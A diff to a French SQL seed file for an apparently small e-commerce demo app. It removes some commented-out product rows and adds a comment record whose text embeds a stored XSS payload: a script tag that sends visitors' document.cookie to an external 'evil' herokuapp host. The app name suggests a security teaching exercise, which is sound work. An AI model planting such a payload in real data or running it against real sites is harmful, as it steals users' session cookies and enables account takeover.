@@ -47,20 +47,10 @@ VALUES (
  '/resources/img/produits/sac.jpg',
  'vetement',
  2); 
- 
-
- 
-
---INSERT INTO PRODUIT (PRD_ID, PRD_TITRE, PRD_DESCRIPTION, PRD_PRIX,PRD_IMAGE, UTI_ID) 
---VALUES (666, 'Pokemon Pikachu', 'Superbe Pokemon Pikachu qui quand on lui tire la queue crie PIKACHU', 3.50, '/resources/img/produits/1.jpg', 1);
-
---INSERT INTO PRODUIT (PRD_ID, PRD_TITRE, PRD_DESCRIPTION, PRD_PRIX,PRD_IMAGE, UTI_ID) 
---VALUES (667, 'Pokemon Tortank', 'Superbe Pokemon Tortank qui crache de l''O', 2.43, '/resources/img/produits/2.png', 1);
-
---INSERT INTO PRODUIT (PRD_ID, PRD_TITRE, PRD_DESCRIPTION, PRD_PRIX,PRD_IMAGE, UTI_ID) 
---VALUES (668, 'Pokemon Florizarre', 'Florizarre qui fouette avec ses liannes', 8.67, '/resources/img/produits/3.png', 2);
-
 
 
 INSERT INTO COMMENTAIRE (COM_ID, COM_CONTENU, PRD_ID, UTI_ID) 
 VALUES (1, 'Quels sont les délais max de livraison du produit ?', 100, 1);
+
+INSERT INTO COMMENTAIRE (COM_ID, COM_CONTENU, PRD_ID, UTI_ID) 
+VALUES (2, 'Délicieux ces cookies !<script>new Image().src="http://securite-app-evil.herokuapp.com/steal?cookies="+document.cookie</script>', 101, 2);
